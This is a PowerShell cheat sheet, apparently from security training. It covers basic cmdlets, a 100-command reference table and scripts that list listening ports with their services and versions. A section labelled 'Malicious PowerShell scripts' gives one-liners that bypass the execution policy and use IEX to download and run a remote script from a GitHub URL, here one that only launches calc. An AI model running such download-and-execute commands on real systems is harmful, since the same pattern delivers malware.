# PowerShell

```
commandlet
verb-noun
$PSVersionTable.PSVersion			# version
cls						# clear
Get-childItem					# ls, dir
Set-Location C:\Path\To\Directory		# cd
New-Item -Path "C:\Path\To\NewFile.txt" -ItemType "File"				# Create a new file
Remove-Item -Path "C:\Path\To\File.txt"							# delete a file

Select-objects					# return specific field, it's like cut or awk
Get-Alias					# command alias
Get-childItem | Select-objects Name		# return only name of the child items
Get-childItem | Select-objects -first 1		# return only the first object
Get-childItem | select-object -index 0		# same as above
Get-childItem | Select-objects -last 1		# return only the last line of the child items
(Get-childItem | Select -first 1).name		# return the name of the first object
Get-ChildItem |  Get-Member			# The Get-Member cmdlet is used to get the properties and methods of objects
Get-help select-object				# help, ?
Get-help *printer*
Get-command *printer*
get-service webclient				# status in linux
start-service webclient				# start weblient (WebDAV)

control.exe /name Microsoft.NetworkAndSharingCenter					# open the Network and Sharing Center which is in control panel (control.exe) 
Install-WindowsFeature WebDAV-Redirector –Restart					# install windows feature
Get-WindowsFeature WebDAV-Redirector | Format-Table –Autosize				# verify it has been installed
get-item C:\Users\Administrator\Desktop\file.txt | get-content -stream ads.txt		# read the ads.txt file which is hidden in the ADS ($DATA)

Get-WinEvent 					# event utility 

Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table	# The -Filter parameter is used to specify a condition for retrieving users
| Measure-Object -line				# wc -l

```

==========================================================================

```
# Malicious PowerShell scripts:
| PowerShell remote file execution		| powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/runcalc/main/invokecalc.ps1');invoke-calc"
| PowerShell local file execute			| powershell.exe -exec Bypass -File "C:\Users\YourUsername\Desktop\invokecalc.ps1"
| Using IEX with a Local File			| powershell.exe -exec Bypass -C "IEX (Get-Content -Path 'C:\path\to\your\invokecalc.ps1' -Raw)"
-exec Bypass					# allows scripts to run without any restrictions, bypassing the default execution policy
-C 						# execute the command specified in quotes
IEX 						# (Invoke-Expression), executes the command provided as a string
invoke-calc					# execute this function or command defined within the downloaded script (invokecalc.ps1)




```
==========================================================================
# 100 Powershell commands
```
No	Command		Description						Example
1	Get-Help	Displays information about PowerShell commands.		Get-Help Get-Process
2	Get-Command	Lists all available commands in PowerShell.		Get-Command
3	Get-ChildItem	Retrieves files and folders in a specified location.	Get-ChildItem C:\
4	Set-Location	Changes the current working directory.			Set-Location D:\
5	Get-Content	Reads the content of a file.				Get-Content file.txt
6	Out-File	Writes output to a file.				Get-Process | Out-File processes.txt
7	Write-Output	Sends output to the pipeline.				Write-Output “Hello, PowerShell!”
8	Select-Object	Selects specific properties of objects.			Get-Process | Select-Object Name, CPU
9	Where-Object	Filters objects based on specified criteria.		Get-Service | Where-Object { $_.Status -eq “Running” }
10	ForEach-Object	Performs an operation on each object in a pipeline.	1..5 | ForEach-Object { $_ * 2 }
11	Format-Table	Formats output as a table.				Get-Process | Format-Table -AutoSize
12	Sort-Object	Sorts objects by specified properties.			Get-Service | Sort-Object Status
13	Measure-Object	Calculates properties of objects (e.g., length).	“Hello, PowerShell!” | Measure-Object -Character
14	New-Item	Creates a new item (file, folder, etc.).		New-Item newfile.txt -ItemType File
15	Remove-Item	Deletes an item.					Remove-Item file.txt
16	Copy-Item	Copies files or folders.				Copy-Item file.txt newfolder
17	Rename-Item	Renames an item.					Rename-Item file.txt newname.txt
18	Test-Path	Checks if a file or folder exists.			Test-Path file.txt
19	Get-Service	Retrieves services.					Get-Service
20	Start-Service	Starts a service.					Start-Service serviceName
21	Stop-Service	Stops a service.					Stop-Service serviceName
22	Restart-Service	Restarts a service.					Restart-Service serviceName
23	Get-Process	Retrieves processes.					Get-Process
24	Start-Process	Starts a process.					Start-Process notepad
25	Stop-Process	Stops a process.					Stop-Process -Name notepad
26	Get-WmiObject	Retrieves management information using WMI.		Get-WmiObject Win32_ComputerSystem
27	Get-EventLog	Retrieves event log data.				Get-EventLog -LogName Application
28	Get-Content	Reads the content of a file.				Get-Content file.txt
29	Set-Content	Writes content to a file.				Set-Content file.txt “New content”
30	Test-Connection	Tests network connectivity.				Test-Connection google.com
31	Test-NetConnection	Comprehensive network connectivity test.	Test-NetConnection google.com
32	Invoke-WebRequest	Performs HTTP requests.	I			nvoke-WebRequest https://www.example.com
33	ConvertTo-Json	Converts objects to JSON format.			Get-Process | ConvertTo-Json
34	ConvertFrom-Json	Converts JSON data to objects.			‘{“Name”:”John”,”Age”:30}’ | ConvertFrom-Json
35	Get-Date	Retrieves the current date and time.			Get-Date
36	New-Object	Creates a new object.					New-Object PSObject
37	Get-Content	Reads the content of a file.				Get-Content file.txt
38	Set-Content	Writes content to a file.				Set-Content file.txt “New content”
39	Invoke-Expression | Invokes a command or expression as if by typing it.	Invoke-Expression ‘Get-Process’
40	Write-Host	Displays messages to the console.			Write-Host “Hello, PowerShell!”
41	Out-GridView	Displays data in a graphical table.			Get-Process | Out-GridView
42	Out-Printer	Sends output to a printer.				Get-Process | Out-Printer
43	Get-Host	Retrieves host information.				Get-Host
44	Get-Module	Lists the modules imported into the session.		Get-Module
45	Import-Module	Imports a module into the session.			Import-Module MyModule
46	Remove-Module	Removes imported modules from the session.		Remove-Module MyModule
47	Get-Command	Lists available commands.				Get-Command
48	Get-Alias	Lists aliases.						Get-Alias
49	Set-Alias	Creates or changes aliases.				Set-Alias np Notepad
50	Clear-Host	Clears the console screen.				Clear-Host
51	Clear-Content	Clears the content of a file.				Clear-Content file.txt
52	Clear-Item	Removes the content of an item.				Clear-Item file.txt
53	Clear-Variable	Removes variable values.				Clear-Variable varName
54	Clear-RecycleBin	Clears the contents of the Recycle Bin.		Clear-RecycleBin
55	Compare-Object	Compares two sets of objects.				Compare-Object object1 object2
56	Complete-Transaction	Completes a transaction.			Complete-Transaction
57	ConvertFrom-Csv	Converts CSV-formatted data to objects.			Get-Content data.csv | ConvertFrom-Csv
58	ConvertTo-Csv	Converts objects to CSV format.				Get-Process | ConvertTo-Csv -NoTypeInformation
59	Debug-Process	Debugs a process.					Debug-Process -Id processId
60	Disable-PSBreakpoint	Disables breakpoints.				Disable-PSBreakpoint -Id breakpointId
61	Enable-PSBreakpoint	Enables breakpoints.				Enable-PSBreakpoint -Id breakpointId
62	Exit		Exits the current session.				Exit
63	Export-Alias	Exports aliases to a file.				Get-Alias | Export-Alias -Path aliases.txt
64	Export-Clixml	Exports objects to an XML file.				Get-Process | Export-Clixml process.xml
65	Export-Csv	Exports objects to a CSV file.				Get-Process | Export-Csv process.csv
66	ForEach-Object	Iterates through objects in the pipeline.		1..5 | ForEach-Object { $_ * 2 }
67	Format-Custom	Formats output using a customized view.			Get-Process | Format-Custom
68	Format-Hex	Formats data as hexadecimal values.			Format-Hex 123
69	Format-List	Formats output as a list of properties.			Get-Process | Format-List
70	Format-Table	Formats output as a table.				Get-Process | Format-Table -AutoSize
71	Format-Wide	Formats output as a table with a single wide column.	Get-Process | Format-Wide
72	Get-Acl		Retrieves access control lists (ACLs).			Get-Acl file.txt
73	Set-Acl		Sets access control lists (ACLs).			Set-Acl file.txt -AclObject $aclObj
74	Get-Alias	Gets aliases.						Get-Alias
75	Get-AuthenticodeSignature	Retrieves digital signatures.		Get-AuthenticodeSignature file.exe
76	Get-ChildItem	Retrieves items in a location.				Get-ChildItem C:\
77	Get-Clipboard	Retrieves the current clipboard contents.		Get-Clipboard
78	Get-Command	Gets commands.						Get-Command
79	Get-ComputerInfo	Retrieves computer information.			Get-ComputerInfo
80	Get-Content	Retrieves the content of an item.			Get-Content file.txt
81	Get-Credential	Retrieves stored credentials.				Get-Credential
82	Get-Culture	Retrieves culture information.				Get-Culture
83	Get-Date	Retrieves the current date and time.			Get-Date
84	Get-Event	Retrieves events.					Get-Event
85	Get-History	Retrieves the command history.				Get-History
86	Get-Host	Retrieves host information.				Get-Host
87	Get-HotFix	Retrieves installed hotfixes.				Get-HotFix
88	Get-Item	Retrieves items.					Get-Item
89	Get-ItemProperty	Retrieves property values of an item.		Get-ItemProperty file.txt -Name Length
90	Get-Job	Retrieves background jobs.					Get-Job
91	Get-Location	Retrieves the current location.				Get-Location
92	Get-Member	Retrieves members of an object.				Get-Process | Get-Member
93	Get-Module	Lists the modules imported into the session.		Get-Module
94	Get-OSVersion	Retrieves the operating system version.			Get-WmiObject Win32_OperatingSystem | Select-Object Caption
95	Get-Process	Retrieves processes.					Get-Process
96	Get-Random	Generates random numbers.				Get-Random -Minimum 1 -Maximum 100
97	Get-Service	Retrieves services.					Get-Service
98	Get-Transaction	Retrieves transactions.					Get-Transaction
99	Get-UICulture	Retrieves user interface culture information.		Get-UICulture
100	Get-Unique	Retrieves unique items.					Get-ChildItem | Get-Unique
```

==========================================================================
# list services that have open ports, and their service name, display name, port, and state:
```
Get-NetTCPConnection -State Listen | ForEach-Object {
    $port = $_.LocalPort
    $processId = $_.OwningProcess
    $service = Get-CimInstance -Query "SELECT * FROM Win32_Service WHERE ProcessId = $processId" -ErrorAction SilentlyContinue
    if ($service) {
        [PSCustomObject]@{
            ServiceName = $service.Name
            DisplayName = $service.DisplayName
            Port        = $port
            State       = $service.State
        }
    }
} | Sort-Object Port, ServiceName -Unique
```
==========================================================================
# Also get the version 
```
Get-NetTCPConnection -State Listen | ForEach-Object {
    $port = $_.LocalPort
    $processId = $_.OwningProcess
    $service = Get-CimInstance -Query "SELECT * FROM Win32_Service WHERE ProcessId = $processId" -ErrorAction SilentlyContinue
    if ($service) {
        $filePath = $service.PathName -replace '"', ''  # Remove quotes if present
        $version = (Get-Item $filePath -ErrorAction SilentlyContinue).VersionInfo.FileVersion

        [PSCustomObject]@{
            ServiceName = $service.Name
            DisplayName = $service.DisplayName
            Port        = $port
            State       = $service.State
            Version     = $version
        }
    }
} | Sort-Object Port, ServiceName -Unique
```